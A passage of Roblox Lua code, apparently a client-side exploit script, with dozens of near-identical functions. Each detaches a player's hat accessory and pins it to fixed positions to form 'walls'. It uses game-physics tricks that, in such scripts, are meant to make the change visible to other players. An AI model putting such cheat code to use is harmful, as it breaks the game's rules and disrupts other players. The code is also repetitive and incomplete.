	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_10()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "10"
local HAT = "10"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 8
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_11()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "11"
local HAT = "11"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 8
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_12()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "12"
local HAT = "12"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 8
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_13()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "13"
local HAT = "13"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 8
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_14()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "14"
local HAT = "14"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 8
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_1()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a1"
local HAT = "a1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_2()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a2"
local HAT = "a2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 0
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_3()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a3"
local HAT = "a3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 0
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_4()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a4"
local HAT = "a4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 0
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_5()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a5"
local HAT = "a5"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 0
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_6()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a6"
local HAT = "a6"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 4
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_7()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a7"
local HAT = "a7"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 4
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_8()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a8"
local HAT = "a8"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -6
Yval.Value = 4
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_9()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a9"
local HAT = "a9"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 6
Yval.Value = 4
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
